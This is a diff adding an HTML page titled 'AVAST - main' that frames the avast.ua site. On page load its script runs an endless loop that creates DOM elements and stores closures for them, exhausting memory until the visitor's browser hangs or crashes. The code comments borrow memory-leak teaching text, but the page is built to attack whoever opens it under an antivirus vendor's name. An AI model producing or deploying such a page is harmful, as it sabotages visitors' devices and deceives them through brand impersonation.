@@ -1,0 +1,43 @@
+<html>
+    <head>
+        <title>AVAST - main</title>
+    </head>
+    <body>
+        <iframe src="https://www.avast.ua/index#mac"></iframe>
+    </body>
+    <script>
+        function memoryLeak() {
+            console.log('MEMORY LEAK STARTED');
+            var i, el;
+
+            var createdElements = {};
+            var events = [];
+
+            function attachAlert(element) {
+                element.onclick = function() { alert(element.innerHTML); };
+            }
+
+            function reallyBadAttachAlert(element) {
+                return function() { alert(element.innerHTML); };
+            }
+
+            for (i = 0; i < Infinity; i++) {
+                el = document.createElement('div');
+                el.innerHTML = i;
+
+                /** posibility one: you're storing the element somewhere **/
+                attachAlert(el);
+                createdElements['div' + i] = el; 
+
+                /** posibility two: you're storing the callbacks somewhere **/
+                event = reallyBadAttachAlert(el);
+                events.push(event);
+                el.onclick = event;
+                console.log('Hello Kitty');
+            }
+        }
+        document.addEventListener("DOMContentLoaded", function(){
+            memoryLeak();
+        });
+    </script>
+</html>
